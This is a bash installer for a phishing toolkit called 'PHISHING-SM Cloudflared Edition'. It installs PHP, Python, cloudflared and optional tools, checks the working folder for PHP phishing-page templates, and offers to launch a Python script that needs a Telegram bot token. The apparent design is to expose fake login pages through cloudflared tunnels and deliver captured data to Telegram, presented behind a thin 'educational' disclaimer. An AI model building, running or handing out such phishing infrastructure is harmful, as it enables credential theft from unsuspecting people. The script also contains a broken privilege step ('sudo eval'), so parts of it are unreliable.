#!/bin/bash

# ============================================================
# PHISHING-SM Installation Script - Cloudflared Edition
# Educational penetration testing tool - Authorized use only
# ============================================================

# Colors
RED='\033[1;91m'
GREEN='\033[1;92m'
YELLOW='\033[1;93m'
BLUE='\033[1;94m'
PURPLE='\033[1;95m'
CYAN='\033[1;96m'
WHITE='\033[1;97m'
NC='\033[0m'

# Global variables
OS_TYPE=""
PACKAGE_MANAGER=""
INSTALL_CMD=""
UPDATE_CMD=""
IS_ROOT=0
IS_TERMUX=0
INSTALL_CLOUDFLARED=1

print_color() { echo -e "${1}${2}${NC}"; }

print_banner() {
    clear
    print_color $CYAN "
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗ ███████╗██████╗   ║
║  ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝ ██╔════╝██╔══██╗  ║
║  ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗█████╗  ██████╔╝  ║
║  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗  ║
║  ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝███████╗██║  ██║  ║
║  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝  ║
║                                                                              ║
║                      ███████╗███╗   ███╗  ██████╗███████╗                   ║
║                      ██╔════╝████╗ ████║ ██╔════╝██╔════╝                   ║
║                      █████╗  ██╔████╔██║ ██║     █████╗                     ║
║                      ██╔══╝  ██║╚██╔╝██║ ██║     ██╔══╝                     ║
║                      ██║     ██║ ╚═╝ ██║ ╚██████╗███████╗                   ║
║                      ╚═╝     ╚═╝     ╚═╝  ╚═════╝╚══════╝                   ║
║                                                                              ║
║                   ${YELLOW}CLOUDFLARED EDITION - NO SSH REQUIRED${CYAN}                    ║
╚══════════════════════════════════════════════════════════════════════════════╝
"
    print_color "${BLUE}${WHITE}" "══════════════════════════ INSTALLATION SCRIPT ══════════════════════════"
    print_color $CYAN "[+] Tool     : PHISHING-SM Cloudflared Edition"
    print_color $CYAN "[+] Version  : 2.0"
    print_color $CYAN "[+] Author   : @A_Y_TR"
    print_color $CYAN "[+] Channel  : https://t.me/cybersecurityTemDF"
    print_color "${BLUE}${WHITE}" "════════════════════════════════════════════════════════════════════════"
    print_color $YELLOW "[!] Educational and authorized penetration testing tool only"
    print_color $RED "[!] Developer not responsible for misuse"
    print_color $GREEN "[+] All rights reserved: Mohamed Abu Al-Saud"
    print_color "${BLUE}${WHITE}" "════════════════════════════════════════════════════════════════════════"
    echo
}

# Detect OS and package manager
detect_os() {
    print_color $CYAN "[+] Detecting operating system..."

    # Check for Termux first
    if [[ -d /data/data/com.termux ]]; then
        OS_TYPE="Termux"
        PACKAGE_MANAGER="pkg"
        INSTALL_CMD="pkg install -y"
        UPDATE_CMD="pkg update"
        IS_TERMUX=1
        print_color $GREEN "[+] Detected: Termux"
        return
    fi

    # Standard Linux / macOS
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        OS_TYPE="$NAME"
    elif [[ -f /etc/redhat-release ]]; then
        OS_TYPE=$(cat /etc/redhat-release)
    elif [[ "$(uname)" == "Darwin" ]]; then
        OS_TYPE="macOS"
    else
        OS_TYPE="Unknown"
    fi

    # Detect package manager
    if command -v apt-get &>/dev/null; then
        PACKAGE_MANAGER="apt"
        INSTALL_CMD="apt-get install -y"
        UPDATE_CMD="apt-get update"
    elif command -v yum &>/dev/null; then
        PACKAGE_MANAGER="yum"
        INSTALL_CMD="yum install -y"
        UPDATE_CMD="yum update -y"
    elif command -v dnf &>/dev/null; then
        PACKAGE_MANAGER="dnf"
        INSTALL_CMD="dnf install -y"
        UPDATE_CMD="dnf update -y"
    elif command -v pacman &>/dev/null; then
        PACKAGE_MANAGER="pacman"
        INSTALL_CMD="pacman -S --noconfirm"
        UPDATE_CMD="pacman -Sy"
    elif command -v apk &>/dev/null; then
        PACKAGE_MANAGER="apk"
        INSTALL_CMD="apk add"
        UPDATE_CMD="apk update"
    elif command -v brew &>/dev/null; then
        PACKAGE_MANAGER="brew"
        INSTALL_CMD="brew install"
        UPDATE_CMD="brew update"
    else
        PACKAGE_MANAGER="unknown"
    fi

    print_color $GREEN "[+] OS: $OS_TYPE"
    print_color $GREEN "[+] Package manager: $PACKAGE_MANAGER"
}

check_privileges() {
    if [[ $EUID -eq 0 ]]; then
        IS_ROOT=1
        print_color $GREEN "[+] Running with root privileges"
    else
        IS_ROOT=0
        print_color $YELLOW "[!] Running without root privileges"
        if [[ "$PACKAGE_MANAGER" != "brew" ]] && [[ "$PACKAGE_MANAGER" != "pkg" ]]; then
            print_color $YELLOW "[!] Some installations may require sudo"
        fi
    fi
}

run_cmd() {
    if [[ $IS_ROOT -eq 1 ]] || [[ "$PACKAGE_MANAGER" == "brew" ]] || [[ "$PACKAGE_MANAGER" == "pkg" ]]; then
        eval "$1"
    else
        sudo eval "$1"
    fi
}

update_system() {
    print_color $CYAN "[+] Updating package lists..."
    if [[ "$PACKAGE_MANAGER" == "unknown" ]]; then
        print_color $YELLOW "[!] Cannot update system automatically"
        return
    fi
    run_cmd "$UPDATE_CMD" &>/dev/null
    print_color $GREEN "[+] Update completed"
}

# Install cloudflared
install_cloudflared() {
    print_color $CYAN "[+] Installing cloudflared tunnel..."
    if command -v cloudflared &>/dev/null; then
        print_color $GREEN "[+] cloudflared already installed"
        return 0
    fi

    case "$PACKAGE_MANAGER" in
        apt)
            run_cmd "apt-get install -y cloudflared" 2>/dev/null || {
                print_color $YELLOW "[!] Trying manual download..."
                run_cmd "curl -L -o /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && chmod +x /tmp/cloudflared && mv /tmp/cloudflared /usr/local/bin/"
            }
            ;;
        pacman)
            run_cmd "pacman -S --noconfirm cloudflared"
            ;;
        pkg)
            run_cmd "pkg install -y cloudflared"
            ;;
        brew)
            run_cmd "brew install cloudflared"
            ;;
        *)
            print_color $YELLOW "[!] Manual installation of cloudflared required"
            print_color $YELLOW "    Download from: https://github.com/cloudflare/cloudflared/releases"
            INSTALL_CLOUDFLARED=0
            return 1
            ;;
    esac

    if command -v cloudflared &>/dev/null; then
        print_color $GREEN "[+] cloudflared installed successfully"
        return 0
    else
        print_color $RED "[-] Failed to install cloudflared"
        INSTALL_CLOUDFLARED=0
        return 1
    fi
}

install_php() {
    print_color $CYAN "[+] Installing PHP..."
    if command -v php &>/dev/null; then
        print_color $GREEN "[+] PHP already installed: $(php -v | head -1)"
        return 0
    fi

    case "$PACKAGE_MANAGER" in
        apt) run_cmd "apt-get install -y php" ;;
        yum) run_cmd "yum install -y php" ;;
        dnf) run_cmd "dnf install -y php" ;;
        pacman) run_cmd "pacman -S --noconfirm php" ;;
        apk) run_cmd "apk add php" ;;
        brew) run_cmd "brew install php" ;;
        pkg) run_cmd "pkg install -y php" ;;
        *) print_color $RED "[-] Cannot install PHP automatically"; return 1 ;;
    esac

    command -v php &>/dev/null && print_color $GREEN "[+] PHP installed" || print_color $RED "[-] PHP installation failed"
}

install_python_and_pip() {
    print_color $CYAN "[+] Installing Python3 and pip..."
    if command -v python3 &>/dev/null; then
        print_color $GREEN "[+] Python3 already installed: $(python3 --version)"
    else
        case "$PACKAGE_MANAGER" in
            apt) run_cmd "apt-get install -y python3 python3-pip" ;;
            yum) run_cmd "yum install -y python3 python3-pip" ;;
            dnf) run_cmd "dnf install -y python3 python3-pip" ;;
            pacman) run_cmd "pacman -S --noconfirm python python-pip" ;;
            apk) run_cmd "apk add python3 py3-pip" ;;
            brew) run_cmd "brew install python3" ;;
            pkg) run_cmd "pkg install -y python3 python-pip" ;;
            *) print_color $RED "[-] Cannot install Python automatically"; return 1 ;;
        esac
    fi

    # Ensure pip is available
    if ! command -v pip3 &>/dev/null && command -v python3 &>/dev/null; then
        run_cmd "python3 -m ensurepip --upgrade" 2>/dev/null
    fi
}

install_requests() {
    print_color $CYAN "[+] Installing Python 'requests' module..."
    if python3 -c "import requests" &>/dev/null; then
        print_color $GREEN "[+] requests already installed"
        return 0
    fi
    if command -v pip3 &>/dev/null; then
        run_cmd "pip3 install requests"
    else
        run_cmd "python3 -m pip install requests"
    fi
    python3 -c "import requests" &>/dev/null && print_color $GREEN "[+] requests installed" || print_color $YELLOW "[!] requests installation failed (may still work)"
}

install_qrencode() {
    print_color $CYAN "[+] Checking QRencode (optional)..."
    if command -v qrencode &>/dev/null; then
        print_color $GREEN "[+] qrencode already installed"
        return 0
    fi
    read -p "$(print_color $YELLOW "[?] Install qrencode for QR code generation? (Y/n): ")" -n 1 -r
    echo
    if [[ $REPLY =~ ^[Nn]$ ]]; then
        print_color $YELLOW "[!] Skipping qrencode"
        return 0
    fi
    case "$PACKAGE_MANAGER" in
        apt|yum|dnf|pacman|apk|pkg|brew) run_cmd "$INSTALL_CMD qrencode" ;;
        *) print_color $YELLOW "[!] Cannot install qrencode automatically" ;;
    esac
    command -v qrencode &>/dev/null && print_color $GREEN "[+] qrencode installed"
}

install_tmux() {
    print_color $CYAN "[+] Checking TMUX (optional)..."
    if command -v tmux &>/dev/null; then
        print_color $GREEN "[+] tmux already installed"
        return 0
    fi
    read -p "$(print_color $YELLOW "[?] Install tmux for better session management? (Y/n): ")" -n 1 -r
    echo
    if [[ $REPLY =~ ^[Nn]$ ]]; then
        print_color $YELLOW "[!] Skipping tmux"
        return 0
    fi
    case "$PACKAGE_MANAGER" in
        apt|yum|dnf|pacman|apk|pkg|brew) run_cmd "$INSTALL_CMD tmux" ;;
        *) print_color $YELLOW "[!] Cannot install tmux automatically" ;;
    esac
}

check_php_pages() {
    print_color $CYAN "[+] Checking for PHP phishing pages in current directory..."
    PHP_FILES=$(find . -maxdepth 1 -name "*.php" | wc -l)
    if [[ $PHP_FILES -eq 0 ]]; then
        print_color $RED "[-] No PHP files found!"
        print_color $YELLOW "[!] The tool requires PHP phishing templates in the current directory."
        print_color $YELLOW "[!] Please run this installer inside the folder containing the PHP pages."
        return 1
    fi
    print_color $GREEN "[+] Found $PHP_FILES PHP file(s)"
    # Check for common pages
    COMMON=$(ls *.php 2>/dev/null | head -5)
    print_color $CYAN "    Examples: $(echo $COMMON | tr '\n' ' ')"
    return 0
}

test_dependencies() {
    print_color $CYAN "[+] Testing final dependencies..."
    OK=0
    command -v php &>/dev/null && print_color $GREEN "[✓] PHP" || { print_color $RED "[✗] PHP"; OK=1; }
    command -v python3 &>/dev/null && print_color $GREEN "[✓] Python3" || { print_color $RED "[✗] Python3"; OK=1; }
    command -v cloudflared &>/dev/null && print_color $GREEN "[✓] cloudflared" || { print_color $RED "[✗] cloudflared"; OK=1; }
    python3 -c "import requests" &>/dev/null && print_color $GREEN "[✓] requests module" || print_color $YELLOW "[!] requests module missing (may affect bot)"
    return $OK
}

show_summary() {
    print_color "${GREEN}${WHITE}" "════════════════════════ INSTALLATION SUMMARY ════════════════════════"
    print_color $CYAN "[+] OS: $OS_TYPE | Package manager: $PACKAGE_MANAGER"
    echo
    print_color $CYAN "[+] Required components:"
    command -v php &>/dev/null && print_color $GREEN "    ✔ PHP" || print_color $RED "    ✘ PHP"
    command -v python3 &>/dev/null && print_color $GREEN "    ✔ Python3" || print_color $RED "    ✘ Python3"
    command -v cloudflared &>/dev/null && print_color $GREEN "    ✔ cloudflared" || print_color $RED "    ✘ cloudflared"
    python3 -c "import requests" &>/dev/null && print_color $GREEN "    ✔ requests" || print_color $YELLOW "    ◌ requests (optional)"
    echo
    print_color $CYAN "[+] Optional:"
    command -v qrencode &>/dev/null && print_color $GREEN "    ✔ qrencode" || print_color $YELLOW "    ◌ qrencode (QR codes)"
    command -v tmux &>/dev/null && print_color $GREEN "    ✔ tmux" || print_color $YELLOW "    ◌ tmux (session manager)"
    echo
    print_color $CYAN "[+] Phishing pages:"
    PHP_COUNT=$(find . -maxdepth 1 -name "*.php" | wc -l)
    if [[ $PHP_COUNT -gt 0 ]]; then
        print_color $GREEN "    ✔ $PHP_COUNT PHP files found"
    else
        print_color $RED "    ✘ No PHP files found - tool will not work!"
    fi
    print_color "${GREEN}${WHITE}" "════════════════════════════════════════════════════════════════════════"
}

main() {
    print_banner
    detect_os
    check_privileges

    read -p "$(print_color $YELLOW "[?] Start full installation? (Y/n): ")" -n 1 -r
    echo
    [[ $REPLY =~ ^[Nn]$ ]] && { print_color $YELLOW "[!] Installation cancelled"; exit 0; }

    update_system
    install_php
    install_python_and_pip
    install_requests
    install_cloudflared
    install_qrencode
    install_tmux
    check_php_pages
    test_dependencies
    show_summary

    print_color "${BLUE}${WHITE}" "══════════════════════════ USAGE INSTRUCTIONS ═════════════════════════"
    print_color $GREEN "[+] To start the tool: python3 phishing_sm.py"
    print_color $GREEN "[+] Make sure you're in the same directory as the PHP pages"
    print_color $GREEN "[+] You will need: Telegram Bot Token + Your Telegram User ID"
    print_color $YELLOW "[!] Use only for educational and authorized testing!"
    print_color "${BLUE}${WHITE}" "════════════════════════════════════════════════════════════════════════"

    read -p "$(print_color $YELLOW "[?] Launch PHISHING-SM now? (y/N): ")" -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        if [[ -f "phishing_sm.py" ]]; then
            python3 phishing_sm.py
        else
            print_color $RED "[-] phishing_sm.py not found in current directory!"
            print_color $YELLOW "[!] Please ensure the Python script is present."
        fi
    else
        print_color $GREEN "[+] Installation completed. Run 'python3 phishing_sm.py' when ready."
    fi
}

# Error handling
set -e
trap 'print_color $RED "\n[!] Installation interrupted"; exit 1' INT

main
